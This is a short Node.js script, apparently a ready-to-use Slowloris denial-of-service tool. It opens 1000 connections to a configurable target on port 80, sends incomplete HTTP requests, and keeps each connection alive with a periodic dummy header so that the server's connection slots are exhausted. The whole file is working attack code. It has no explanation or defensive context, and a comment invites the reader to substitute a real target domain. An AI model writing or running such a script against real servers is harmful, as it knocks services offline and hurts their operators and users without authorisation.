const net = require('net');
const target = 'example.com'; // Replace with target domain
const port = 80;
const connections = 1000; // Increase connections
const headerInterval = 5000; // Time interval for sending headers (5 seconds)

function ultimateSlowloris() {
    for (let i = 0; i < connections; i++) {
        const socket = net.createConnection(port, target, () => {
            console.log(`[Connection ${i}] Established with ${target}:${port}`);
            socket.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n');
        });

        setInterval(() => {
            socket.write('X-a: keep-alive\r\n'); // Periodically send keep-alive headers
            console.log(`[Connection ${i}] Header sent to ${target}`);
        }, headerInterval);

        socket.on('error', (err) => {
            console.error(`[Connection ${i}] Error: ${err.message}`);
        });
    }
}

ultimateSlowloris();